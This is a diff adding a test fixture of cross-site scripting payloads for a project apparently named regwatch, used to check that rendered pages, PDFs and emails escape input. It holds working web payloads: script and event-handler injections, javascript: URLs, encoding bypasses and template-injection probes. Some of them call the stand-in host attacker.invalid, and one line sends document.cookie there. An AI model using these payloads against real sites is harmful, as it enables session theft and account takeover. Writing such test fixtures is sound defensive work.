@@ -1,0 +1,48 @@
+# regwatch security payloads: cross-site scripting (issue #12, REQ-25; docs/07-testing-quality.md 7.7)
+# Format: header lines start with "#"; after the header, one payload per line. Blank lines are ignored.
+# encoding: raw (each line is used exactly as written)
+# Use: put each payload into captured titles, summaries, item text, report fields, saved-view
+# names and email subjects; the rendered UI, PDF and email must show it as inert text.
+<script>alert(1)</script>
+<SCRIPT SRC=https://attacker.invalid/x.js></SCRIPT>
+<img src=x onerror=alert(1)>
+<img src="x" onerror="fetch('https://attacker.invalid/?c='+document.cookie)">
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<a href="javascript:alert(1)">click</a>
+<a href="JaVaScRiPt:alert(1)">click</a>
+<a href="java&#x09;script:alert(1)">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)></video>
+<object data="javascript:alert(1)"></object>
+<embed src="javascript:alert(1)">
+<form action="javascript:alert(1)"><button>go</button></form>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<base href="https://attacker.invalid/">
+<link rel="stylesheet" href="https://attacker.invalid/x.css">
+<style>@import 'https://attacker.invalid/x.css';</style>
+<div style="background:url(javascript:alert(1))">x</div>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<scr<script>ipt>alert(1)</scr</script>ipt>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+\u003cscript\u003ealert(1)\u003c/script\u003e
+{{constructor.constructor('alert(1)')()}}
+{{7*7}}
+${7*7}
+{% raw %}{{ config.items() }}{% endraw %}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<template><script>alert(1)</script></template>
+<x onclick=alert(1)>click me</x>
+javascript:alert(document.domain)
